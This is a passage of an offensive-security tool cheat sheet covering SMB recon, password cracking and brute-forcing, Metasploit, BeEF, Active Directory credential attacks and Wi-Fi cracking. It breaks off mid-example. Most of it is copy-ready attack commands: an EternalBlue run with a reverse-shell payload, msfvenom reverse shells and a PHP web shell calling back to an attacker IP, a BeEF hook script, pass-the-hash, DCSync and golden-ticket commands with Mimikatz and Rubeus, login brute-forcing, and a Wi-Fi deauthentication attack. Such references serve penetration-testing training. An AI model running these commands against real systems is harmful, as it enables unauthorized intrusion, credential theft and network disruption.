| `-P` | Password policy |

💡 **Example:**
```bash
# Full enumeration (unauthenticated)
enum4linux-ng -A 10.10.10.5

# Authenticated full enum
enum4linux-ng -A -u "user" -p "password" 10.10.10.5

# Old enum4linux
enum4linux -a 10.10.10.5
```

---

### Tool 40 — smbclient

**Description:** FTP-like SMB client for browsing, connecting, uploading, and downloading files from SMB shares.

📦 **Install:** Pre-installed. `sudo apt install smbclient`

🔧 **Syntax:** `smbclient //<host>/<share> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-L` | List available shares |
| `-U` | Username |
| `-N` | No password (null session) |
| `-c` | Run command non-interactively |
| `--no-pass` | Null session |

💡 **Example:**
```bash
# List shares (null session)
smbclient -L //10.10.10.5 -N

# Connect to share
smbclient //10.10.10.5/SYSVOL -U "DOMAIN\admin%password"

# Download file recursively
smbclient //10.10.10.5/share -N -c "recurse;prompt;mget *"

# Pass-the-Hash
smbclient //10.10.10.5/C$ -U Administrator --pw-nt-hash NTLM_HASH
```

---

### Tool 41 — arp-scan

**Description:** ARP scanner for host discovery on local network segments, much faster than ping sweeps.

📦 **Install:** `sudo apt install arp-scan`

🔧 **Syntax:** `sudo arp-scan [options] <target>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-l` | Scan local subnet (auto-detect) |
| `-I` | Network interface |
| `--retry` | Number of retries |
| `--bandwidth` | Max bandwidth |

💡 **Example:**
```bash
# Scan local subnet
sudo arp-scan -l

# Specific interface
sudo arp-scan -I eth0 192.168.1.0/24

# Faster scan
sudo arp-scan -l --retry=1 --bandwidth=100M
```

---

### Tool 42 — hping3

**Description:** TCP/IP packet assembler for firewall testing, port scanning, path MTU discovery, SYN flooding, and custom packet crafting.

📦 **Install:** `sudo apt install hping3`

🔧 **Syntax:** `hping3 [options] <target>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-S` | SYN flag |
| `-p` | Destination port |
| `-c` | Packet count |
| `--flood` | Flood mode |
| `-A` | ACK scan |

💡 **Example:**
```bash
# SYN scan (port probe)
sudo hping3 -S -p 80 10.10.10.5

# Traceroute via TCP
sudo hping3 --traceroute -S -p 80 10.10.10.5

# ACK scan (firewall bypass)
sudo hping3 -A -p 80 10.10.10.5 -c 3
```

---

### Tool 43 — scapy

**Description:** Powerful Python packet manipulation library for crafting, sending, sniffing, and dissecting arbitrary network packets.

📦 **Install:** `sudo apt install python3-scapy` or `pip install scapy`

🔧 **Syntax:** `sudo scapy` (interactive) or import in Python scripts

🏷️ **Key Functions:**

| Function | Description |
|----------|-------------|
| `IP()` | IP layer |
| `TCP()` | TCP layer |
| `send()` | Send packet at L3 |
| `sr1()` | Send and receive one response |
| `sniff()` | Packet capture |

💡 **Example:**
```python
# In scapy interactive shell
from scapy.all import *

# SYN scan
ans = sr1(IP(dst="10.10.10.5")/TCP(dport=80, flags="S"), timeout=1)

# ARP ping
ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)

# Custom ICMP packet
pkt = IP(dst="target")/ICMP()
send(pkt)
```

---

### Tool 44 — netdiscover

**Description:** Active/passive ARP reconnaissance tool for network host discovery on local segments.

📦 **Install:** `sudo apt install netdiscover`

🔧 **Syntax:** `sudo netdiscover [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-r` | IP range to scan |
| `-i` | Interface |
| `-p` | Passive mode |
| `-N` | No header output |
| `-F` | Custom pcap filter |

💡 **Example:**
```bash
# Active scan on subnet
sudo netdiscover -r 192.168.1.0/24 -i eth0

# Passive mode (listen only)
sudo netdiscover -p -i eth0

# Specific range
sudo netdiscover -r 10.10.10.0/24 -N
```

---

### Tool 45 — CrackMapExec / NetExec

**Description:** Swiss Army knife for network-wide SMB/LDAP/RDP/SSH authentication, enumeration, and execution. Covers both recon and AD attack phases.

📦 **Install:** `sudo apt install crackmapexec` | `pip install netexec`

🔧 **Syntax:** `nxc smb <target> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Username |
| `-p` | Password |
| `--shares` | List shares |
| `--users` | Enumerate users |
| `-x` | Execute command |

💡 **Example:**
```bash
# Network-wide authentication test
nxc smb 192.168.1.0/24 -u user -p pass --shares

# Run command on target
nxc smb 10.10.10.5 -u admin -p pass -x "whoami"

# Enumerate users via SMB
nxc smb 10.10.10.5 -u '' -p '' --users
```

---

## 4. Password & Credential Attacks (Tools 46–55)

> Cracking hashes, brute-forcing services, and generating wordlists.

---

### Tool 46 — hashcat

**Description:** World's fastest GPU-accelerated password recovery tool supporting 300+ hash types and multiple attack modes.

📦 **Install:** `sudo apt install hashcat`

🔧 **Syntax:** `hashcat -m <mode> -a <attack> <hashfile> <wordlist>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-m` | Hash type (0=MD5, 1000=NTLM, 13100=Kerberoast) |
| `-a` | Attack mode (0=wordlist, 3=bruteforce, 6=hybrid) |
| `-r` | Rules file |
| `--show` | Show cracked hashes |
| `-O` | Optimized kernels |

💡 **Example:**
```bash
# NTLM hash crack
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast TGS
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLMv2
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt

# PMKID (WPA2)
hashcat -m 22000 pmkid.hash /usr/share/wordlists/rockyou.txt
```

---

### Tool 47 — John the Ripper

**Description:** Versatile open-source password cracker supporting 100+ hash formats with auto-detection; great for offline cracking.

📦 **Install:** `sudo apt install john`

🔧 **Syntax:** `john [options] <hashfile>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `--wordlist` | Use wordlist attack |
| `--rules` | Apply mangling rules |
| `--format` | Specify hash format |
| `--show` | Display cracked passwords |
| `--incremental` | Brute-force mode |

💡 **Example:**
```bash
# Auto-detect and crack
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specific format
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john hashes.txt --show

# Convert shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Tool 48 — hydra

**Description:** Fast network login cracker supporting 50+ protocols: SSH, FTP, HTTP, SMB, RDP, SMTP, MySQL, and more.

📦 **Install:** `sudo apt install hydra`

🔧 **Syntax:** `hydra -l <user> -P <wordlist> <host> <protocol>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-l/-L` | Single login / login list |
| `-p/-P` | Single password / password list |
| `-t` | Tasks (parallel threads) |
| `-f` | Stop after first valid combo |
| `-o` | Output file |

💡 **Example:**
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

# HTTP POST login
hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# FTP attack
hydra -l admin -P passwords.txt ftp://10.10.10.5 -t 10 -f
```

---

### Tool 49 — medusa

**Description:** Speedy, massively parallel network login brute-forcer similar to hydra with modular protocol support.

📦 **Install:** `sudo apt install medusa`

🔧 **Syntax:** `medusa -h <host> -u <user> -P <wordlist> -M <module>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-h` | Target host |
| `-u/-U` | Username / user file |
| `-P` | Password file |
| `-M` | Module (ssh, ftp, smb, http) |
| `-t` | Total tasks |

💡 **Example:**
```bash
# SSH brute force
medusa -h 10.10.10.5 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# SMB with user list
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M smbnt -t 5

# RDP attack
medusa -h 10.10.10.5 -u Administrator -P passwords.txt -M rdp
```

---

### Tool 50 — crowbar

**Description:** Brute-force tool specifically designed for RDP, VNC, OpenVPN, and SSH with key authentication support.

📦 **Install:** `sudo apt install crowbar`

🔧 **Syntax:** `crowbar -b <protocol> -s <target> -u <user> -C <wordlist>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-b` | Protocol (rdp, openvpn, sshkey, vnckey) |
| `-s` | Target server |
| `-u` | Username |
| `-C` | Password list |
| `-n` | Number of threads |

💡 **Example:**
```bash
# RDP brute force
crowbar -b rdp -s 10.10.10.5/32 -u admin -C /usr/share/wordlists/rockyou.txt

# SSH key brute force
crowbar -b sshkey -s 10.10.10.5/32 -u root -k /root/.ssh/

# VNC attack
crowbar -b vnc -s 10.10.10.5/32 -C passwords.txt
```

---

### Tool 51 — CeWL

**Description:** Custom wordlist generator that spiders a website and creates wordlists from its content for targeted password attacks.

📦 **Install:** `sudo apt install cewl`

🔧 **Syntax:** `cewl <url> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-d` | Crawl depth |
| `-m` | Minimum word length |
| `-w` | Output file |
| `--email` | Extract email addresses |
| `-a` | Include meta data |

💡 **Example:**
```bash
# Generate wordlist from site
cewl http://target.com -d 3 -m 8 -w target_wordlist.txt

# Include email addresses
cewl http://target.com -d 2 -m 5 --email -w combined.txt

# Use with hydra
hydra -l admin -P target_wordlist.txt ssh://10.10.10.5
```

---

### Tool 52 — crunch

**Description:** Wordlist generator that creates custom wordlists based on specified character sets, patterns, and lengths.

📦 **Install:** `sudo apt install crunch`

🔧 **Syntax:** `crunch <min> <max> [charset] [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-o` | Output file |
| `-t` | Pattern (@ lowercase, , uppercase, % digit, ^ symbol) |
| `-f` | Character set file |
| `-p` | Permutations of words |
| `-d` | Limit consecutive same characters |

💡 **Example:**
```bash
# 8-character lowercase wordlist
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o 8char.txt

# PIN code list (4-digit)
crunch 4 4 0123456789 -o pins.txt

# Permutations
crunch 1 1 -p Monday Tuesday Wednesday -o days.txt
```

---

### Tool 53 — CUPP (Common User Passwords Profiler)

**Description:** Interactive tool that generates targeted password lists based on personal information (name, DOB, pets, company).

📦 **Install:** `sudo apt install cupp` or `git clone https://github.com/Mebus/cupp`

🔧 **Syntax:** `cupp -i` (interactive) or `cupp -w <wordlist>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-i` | Interactive profile builder |
| `-w` | Improve existing wordlist |
| `-a` | Download from ALECTO database |
| `-l` | List wordlists from repository |

💡 **Example:**
```bash
# Interactive targeted wordlist
cupp -i
# Prompts for: name, birth date, partner name, child name, pet name, company, etc.

# Improve existing wordlist with mutations
cupp -w rockyou.txt
```

---

### Tool 54 — rockyou.txt (Reference)

**Description:** The most widely used password wordlist, originally leaked from RockYou.com breach containing 14+ million passwords.

📦 **Location:** `/usr/share/wordlists/rockyou.txt.gz` (gunzip first)

🔧 **Usage:**
```bash
# Extract
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Use with tools
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target

# SecLists (comprehensive wordlist collection)
sudo apt install seclists
ls /usr/share/seclists/Passwords/
```

---

### Tool 55 — kwprocessor

**Description:** Advanced keyboard walk generator for creating keyboard pattern wordlists (qwerty walks, number rows, etc.).

📦 **Install:** `git clone https://github.com/hashcat/kwprocessor && make`

🔧 **Syntax:** `kwp [basechars] [keymaps] [routes]`

🏷️ **Key Options:**

| Option | Description |
|--------|-------------|
| `-z` | Optimize output |
| `--keywalk-south` | Include south walks |
| `--keywalk-east` | Include east walks |
| `-o` | Output file |

💡 **Example:**
```bash
# Generate keyboard walk patterns
./kwp basechars/tiny.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route \
  -o keyboard_walks.txt

# Use with hashcat
hashcat -m 1000 hashes.txt keyboard_walks.txt
```

---

## 5. Exploitation Frameworks (Tools 56–65)

> Frameworks and tools for delivering, staging, and managing exploits.

---

### Tool 56 — Metasploit Framework (msfconsole)

**Description:** The world's most widely used penetration testing framework with 2000+ exploits, payloads, auxiliary modules, and post modules.

📦 **Install:** Pre-installed on Kali. `sudo msfdb init && msfconsole`

🔧 **Core Workflow:** `use <module> -> set options -> run/exploit`

🏷️ **Key Commands:**

| Command | Description |
|---------|-------------|
| `search <term>` | Search modules |
| `use <module>` | Load a module |
| `set/setg` | Set option / Set globally |
| `show options` | Display required options |
| `sessions -i <id>` | Interact with session |

💡 **Example:**
```bash
# Launch console
msfconsole

# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Post exploitation
sessions -i 1
getsystem
hashdump
run post/multi/recon/local_exploit_suggester
```

---

### Tool 57 — msfvenom

**Description:** Payload generator and encoder component of Metasploit for creating standalone shellcode, binaries, and web shells.

📦 **Install:** Included with Metasploit.

🔧 **Syntax:** `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-p` | Payload module |
| `-f` | Output format (exe, elf, raw, python) |
| `-e` | Encoder |
| `-i` | Encoding iterations |
| `-o` | Output file |

💡 **Example:**
```bash
# Windows reverse TCP exe
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

---

### Tool 58 — searchsploit

**Description:** Command-line search tool for the Exploit-DB local database, enabling offline access to public exploits and PoCs.

📦 **Install:** `sudo apt install exploitdb`

🔧 **Syntax:** `searchsploit <search term>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-t` | Search title only |
| `-e` | Exact match |
| `--id` | Show EDB-ID |
| `-m <EDB-ID>` | Mirror/copy exploit to current dir |
| `-x <EDB-ID>` | Examine exploit in pager |

💡 **Example:**
```bash
# Search for Apache exploits
searchsploit apache 2.4.49

# Copy exploit to current directory
searchsploit -m 50383

# Search by CVE
searchsploit CVE-2021-41773

# Show full path of exploit
searchsploit --path openssh 7.2
```

---

### Tool 59 — Exploit-DB (web reference)

**Description:** Online archive of exploits and vulnerable software maintained by Offensive Security — the web counterpart to searchsploit.

📦 **URL:** `https://www.exploit-db.com`

💡 **Example Workflow:**
```bash
# Find exploit on website, note EDB-ID (e.g. 50383)
# Download via searchsploit locally
searchsploit -m 50383

# Or via curl
curl https://www.exploit-db.com/raw/50383 -o exploit.py

# Check exploit
python3 exploit.py --help
```

---

### Tool 60 — BeEF (Browser Exploitation Framework)

**Description:** Web-based framework focusing on browser-side attacks: XSS hooks, social engineering, credential harvesting, and browser fingerprinting.

📦 **Install:** `sudo apt install beef-xss`

🔧 **Syntax:** `sudo beef-xss` then navigate to `http://127.0.0.1:3000/ui/panel`

🏷️ **Key Modules:**

| Module | Description |
|--------|-------------|
| `Network -> Port Scanner` | Scan victim's internal network |
| `Social Engineering` | Phishing overlays |
| `Persistence` | MitB / Clickjacking |
| `Browser -> Fingerprint` | Detect browser info |

💡 **Example:**
```bash
# Start BeEF
sudo beef-xss

# Hook script to inject
# <script src="http://ATTACKER_IP:3000/hook.js"></script>

# Deliver via XSS vulnerability
# Access hooked browsers in panel at http://127.0.0.1:3000/ui/panel
```

---

### Tool 61 — sqlninja

**Description:** SQL Server-focused exploitation tool that leverages SQL injection for OS command execution, reverse shells, and privilege escalation.

📦 **Install:** `sudo apt install sqlninja`

🔧 **Syntax:** `sqlninja -m <mode> -f <config>`

🏷️ **Key Modes:**

| Mode | Description |
|------|-------------|
| `-m t` | Test injection |
| `-m f` | Fingerprint |
| `-m e` | Command execution |
| `-m r` | Reverse shell |

💡 **Example:**
```bash
# Configure sqlninja.conf first with target URL and injection point
# Test SQL injection point
sqlninja -m t -f sqlninja.conf

# Get OS-level command execution
sqlninja -m e -f sqlninja.conf
```

---

### Tool 62 — RouterSploit

**Description:** Exploitation framework dedicated to embedded devices (routers, cameras, NAS) with device-specific exploits and credential scanners.

📦 **Install:** `git clone https://github.com/threat9/routersploit && pip install -r requirements.txt`

🔧 **Syntax:** Run `python3 rsf.py` then use like Metasploit

🏷️ **Key Modules:**

| Module | Description |
|--------|-------------|
| `scanners/autopwn` | Auto-scan and exploit |
| `exploits/routers/` | Device-specific exploits |
| `creds/` | Default credential scanners |

💡 **Example:**
```bash
python3 rsf.py

# Auto-scan router
use scanners/autopwn
set target 192.168.1.1
run

# Default credential check
use creds/routers/router_default_creds
set target 192.168.1.1
run
```

---

### Tool 63 — Armitage

**Description:** GUI front-end for Metasploit that provides collaborative team pentesting, visual network mapping, and one-click exploitation.

📦 **Install:** `sudo apt install armitage`

🔧 **Syntax:** Start MSF RPC: `msfrpcd -U msf -P password` then launch `armitage`

🏷️ **Key Features:**

| Feature | Description |
|---------|-------------|
| Hail Mary | Automated exploitation |
| Network Graph | Visual target map |
| Teamserver | Multi-user collaboration |
| Post-exploitation | Integrated shell/meterpreter |

---

### Tool 64 — Cobalt Strike (Overview)

**Description:** Commercial adversary simulation and red team operations platform featuring malleable C2, Beacon payloads, and team collaboration.

> Note: Cobalt Strike requires a paid license. Only for authorized red team engagements.

🔧 **Key Concepts:**

| Concept | Description |
|---------|-------------|
| Beacon | Lightweight C2 agent |
| Malleable C2 | Customizable C2 traffic profiles |
| Aggressor Script | Automation/customization language |
| Teamserver | Shared collaborative backend |
| Arsenal Kit | BOF/UDRL payload customization |

---

### Tool 65 — SILENTTRINITY / Covenant (Overview)

**Description:** Modern C2 frameworks using .NET and encrypted communications for post-exploitation operations.

**SILENTTRINITY:** Python/Boo-based async C2 framework.
**Covenant:** .NET C2 with web GUI, Grunt implants, and listener management.

🔧 **Covenant Quick Start:**
```bash
git clone https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet run
# Access https://localhost:7443 in browser
```

---

## 6. Active Directory (Tools 66–75)

> Attacks against Windows Active Directory environments.

---

### Tool 66 — BloodHound

**Description:** Active Directory attack path mapping tool using graph theory (Neo4j) to visualize relationships and identify attack paths to Domain Admin.

📦 **Install:** `sudo apt install bloodhound`

🔧 **Syntax:** Launch with `bloodhound` after starting Neo4j: `sudo neo4j start`

🏷️ **Key Queries:**

| Query | Description |
|-------|-------------|
| Find Shortest Paths to Domain Admins | Primary attack path |
| Find All Domain Admins | Enumerate DA members |
| Find Computers with Unconstrained Delegation | Privilege escalation vector |
| Find AS-REP Roastable Users | AS-REP targets |

💡 **Example:**
```bash
# Start Neo4j
sudo neo4j start

# Launch BloodHound
bloodhound &

# Default login: neo4j / bloodhound
# Import SharpHound zip file via drag-and-drop
# Run cypher queries in analysis tab
```

---

### Tool 67 — SharpHound

**Description:** The official BloodHound data collector (ingestor) for enumerating AD objects, ACLs, sessions, trusts, and GPOs.

📦 **Install:** Download from BloodHound releases or `sudo apt install sharphound`

🔧 **Syntax:** `SharpHound.exe -c All --zipfilename output.zip`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-c` | Collection methods (All, Session, ACL, etc.) |
| `--domain` | Target domain |
| `--ldapusername/-p` | Credentials |
| `--zipfilename` | Output zip name |
| `--stealth` | Stealth collection |

💡 **Example:**
```bash
# From Windows target
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Linux alternative (Python BloodHound)
pip install bloodhound
bloodhound-python -u user -p password -ns 10.10.10.5 -d DOMAIN.LOCAL -c all

# Transfer zip to attacker, import into BloodHound
```

---

### Tool 68 — Mimikatz

**Description:** The definitive credential extraction tool for Windows; dumps cleartext passwords, NTLM hashes, Kerberos tickets, and enables pass-the-ticket.

📦 **Install:** Download from `https://github.com/gentilkiwi/mimikatz/releases`

🔧 **Core Commands:**

| Command | Description |
|---------|-------------|
| `sekurlsa::logonpasswords` | Dump cleartext creds |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Dump SAM database |
| `lsadump::dcsync` | DCSync attack |
| `kerberos::list /export` | Export Kerberos tickets |

💡 **Example:**
```
mimikatz.exe

privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /user:DOMAIN\Administrator /domain:DOMAIN.LOCAL
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

---

### Tool 69 — Rubeus

**Description:** C# toolset for raw Kerberos interactions: Kerberoasting, AS-REP Roasting, ticket requests, pass-the-ticket, and S4U abuse.

📦 **Install:** Download from `https://github.com/GhostPack/Rubeus/releases`

🔧 **Core Commands:**

| Command | Description |
|---------|-------------|
| `kerberoast` | Kerberoast all SPNs |
| `asreproast` | AS-REP Roast |
| `ptt` | Pass-the-Ticket |
| `s4u` | S4U2Self/S4U2Proxy abuse |
| `harvest` | Harvest TGTs |

💡 **Example:**
```
# Kerberoast
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# AS-REP Roast
.\Rubeus.exe asreproast /outfile:asreproast.txt /format:hashcat

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:base64_ticket

# S4U (constrained delegation abuse)
.\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /ptt
```

---

### Tool 70 — Kerbrute

**Description:** Fast Kerberos username enumeration and password spraying tool using the KRB_AS_REQ protocol without lockout risk.

📦 **Install:** Download from `https://github.com/ropnop/kerbrute/releases`

🔧 **Syntax:** `kerbrute <command> --dc <DC> --domain <DOMAIN>`

🏷️ **Key Commands:**

| Command | Description |
|---------|-------------|
| `userenum` | Enumerate valid usernames |
| `passwordspray` | Password spray attack |
| `bruteuser` | Brute force single user |
| `bruteforce` | User+pass combination file |

💡 **Example:**
```bash
# Username enumeration
./kerbrute userenum -d DOMAIN.LOCAL --dc 10.10.10.5 usernames.txt

# Password spray
./kerbrute passwordspray -d DOMAIN.LOCAL --dc 10.10.10.5 users.txt "Password123!"

# Brute force single account
./kerbrute bruteuser -d DOMAIN.LOCAL --dc 10.10.10.5 passwords.txt administrator
```

---

### Tool 71 — CrackMapExec / NetExec (AD mode)

**Description:** Swiss Army knife for Active Directory: SMB/LDAP/RDP/SSH enumeration, authentication testing, command execution, and module support.

📦 **Install:** `sudo apt install crackmapexec` | `pip install netexec`

🔧 **Syntax:** `nxc <protocol> <target> [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `--pass-pol` | Get password policy |
| `--sam` | Dump SAM remotely |
| `-M` | Module (e.g. lsassy, nanodump) |
| `--continue-on-success` | Don't stop on first success |
| `--lsa` | Dump LSA secrets |

💡 **Example:**
```bash
# SMB authentication test across subnet
nxc smb 192.168.1.0/24 -u admin -p 'Password123!'

# Enumerate logged-on users
nxc smb 10.10.10.5 -u admin -p pass --loggedon-users

# Execute command
nxc smb 10.10.10.5 -u admin -p pass -x "net localgroup administrators"

# Dump secrets with module
nxc smb 10.10.10.5 -u admin -p pass -M lsassy
```

---

### Tool 72 — Evil-WinRM

**Description:** WinRM (Windows Remote Management) shell for pentesting; supports pass-the-hash, file upload/download, and script loading.

📦 **Install:** `sudo gem install evil-winrm`

🔧 **Syntax:** `evil-winrm -i <host> -u <user> -p <pass>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-i` | Target IP |
| `-u` | Username |
| `-p` | Password |
| `-H` | NTLM hash (pass-the-hash) |
| `-s` | Scripts directory |

💡 **Example:**
```bash
# Password auth
evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!'

# Pass-the-hash
evil-winrm -i 10.10.10.5 -u administrator -H NTLM_HASH

# With PowerShell scripts directory
evil-winrm -i 10.10.10.5 -u admin -p pass -s /opt/PowerSploit/

# Upload/download files
# upload /local/file.exe C:\Windows\Temp\file.exe
# download C:\Windows\NTDS\ntds.dit /local/ntds.dit
```

---

### Tool 73 — PowerView

**Description:** PowerShell-based AD reconnaissance module from PowerSploit for enumerating users, groups, computers, ACLs, and trusts.

📦 **Install:** `git clone https://github.com/PowerShellMafia/PowerSploit`

🔧 **Core Functions:**

| Function | Description |
|----------|-------------|
| `Get-DomainUser` | Enumerate domain users |
| `Get-DomainGroup` | Enumerate domain groups |
| `Get-DomainComputer` | Enumerate computers |
| `Find-LocalAdminAccess` | Find admin access |
| `Get-ObjectAcl` | Enumerate ACLs |

💡 **Example:**
```powershell
# Load PowerView
. .\PowerView.ps1

# Get all domain users
Get-DomainUser | select samaccountname, memberof

# Find Domain Admins
Get-DomainGroupMember "Domain Admins"

# Find users with SPN set (Kerberoastable)
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Find DCSync rights holders
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" }
```

---

### Tool 74 — ADACLScanner

**Description:** PowerShell tool for creating reports of Active Directory object ACLs for identifying permission misconfigurations.

📦 **Install:** `git clone https://github.com/canix1/ADACLScanner`

🔧 **Syntax:**
```powershell
.\ADACLScan.ps1 -Base "DC=domain,DC=local" -Output HTML -Show
```

💡 **Example:**
```powershell
# Scan entire domain ACLs
.\ADACLScan.ps1 -Base "DC=DOMAIN,DC=LOCAL" -Output HTML -Show

# Focus on specific OU
.\ADACLScan.ps1 -Base "OU=Users,DC=DOMAIN,DC=LOCAL" -Filter "*" -Output HTML
```

---

### Tool 75 — ldapdomaindump

**Description:** LDAP-based Active Directory information gatherer that outputs structured HTML/JSON/CSV reports of all AD objects.

📦 **Install:** `pip install ldapdomaindump`

🔧 **Syntax:** `ldapdomaindump -u 'DOMAIN\user' -p 'pass' <dc-ip>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-u` | Username with domain |
| `-p` | Password |
| `-o` | Output directory |
| `--no-html` | Skip HTML output |
| `--no-json` | Skip JSON output |

💡 **Example:**
```bash
# Full AD dump
ldapdomaindump -u 'DOMAIN\user' -p 'Password123!' 10.10.10.5 -o ldap_dump/

# View results
ls ldap_dump/
# domain_users.html, domain_computers.html, domain_groups.html, etc.
```

---

## 7. Wireless Testing (Tools 76–80)

> Attacking Wi-Fi networks and capturing WPA handshakes.

---

### Tool 76 — Aircrack-ng Suite

**Description:** Complete suite for 802.11 WEP/WPA/WPA2 cracking: monitor mode, packet capture, replay attacks, and key cracking.

📦 **Install:** `sudo apt install aircrack-ng`

🔧 **Workflow:**

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Discover networks
sudo airodump-ng wlan0mon

# 3. Capture target handshake
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# 4. Deauth client to force handshake
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# 5. Crack captured handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

🏷️ **Key Tools:**

| Tool | Description |
|------|-------------|
| `airmon-ng` | Manage monitor mode interfaces |
| `airodump-ng` | Packet capture/network discovery |
| `aireplay-ng` | Packet injection and deauth |
| `aircrack-ng` | WEP/WPA key cracking |

---

### Tool 77 — hashcat (PMKID attack)

**Description:** Modern WPA2 attack without requiring a 4-way handshake, capturing PMKID directly from the AP beacon.

📦 **Install:** `sudo apt install hashcat`

🔧 **PMKID Workflow:**
```bash
# Capture PMKID with hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3

# Convert with hcxtools
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack with hashcat (mode 22000)
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
```

---

### Tool 78 — hcxdumptool

**Description:** Tool for capturing WPA handshakes and PMKID frames from Wi-Fi networks; supports active and passive capture modes.

📦 **Install:** `sudo apt install hcxdumptool`

🔧 **Syntax:** `sudo hcxdumptool -i <interface> -o <output.pcapng>`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `-i` | Interface (in monitor mode) |
| `-o` | Output pcapng file |
| `--enable_status` | Status display bitmask |
| `--filterlist_ap` | Filter specific BSSIDs |
| `--rds` | Random delay |

💡 **Example:**
```bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3

# Target specific AP
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --filterlist_ap=bssid_filter.txt --filtermode=2
```

---

### Tool 79 — hcxtools

**Description:** Tools for converting captured Wi-Fi data between formats and computing hash values for hashcat cracking.

📦 **Install:** `sudo apt install hcxtools`

🔧 **Core Tools:**

| Tool | Description |
|------|-------------|
| `hcxpcapngtool` | Convert pcapng to hashcat format |
| `hcxhashtool` | Hash manipulation and filtering |
| `wlancap2hashcat` | Convert wlan capture format |

💡 **Example:**
```bash
# Convert pcapng to hashcat format 22000
hcxpcapngtool -o hashes.22000 capture.pcapng

# Show SSID and BSSID from capture
hcxpcapngtool --info capture.pcapng

# Filter by ESSID
hcxhashtool -i hashes.22000 --essid-source=essids.txt -o filtered.22000
```

---

### Tool 80 — Wifite

**Description:** Automated wireless attack tool that orchestrates aircrack-ng, hashcat, hcxdumptool for end-to-end Wi-Fi attacks.

📦 **Install:** `sudo apt install wifite`

🔧 **Syntax:** `sudo wifite [options]`

🏷️ **Key Flags:**

| Flag | Description |
|------|-------------|
| `--wpa` | WPA targets only |
| `--pmkid` | PMKID attack only |
| `--dict` | Wordlist for cracking |
| `--bssid` | Target specific AP |
| `--kill` | Kill conflicting processes |

💡 **Example:**
```bash
# Auto-attack WPA networks
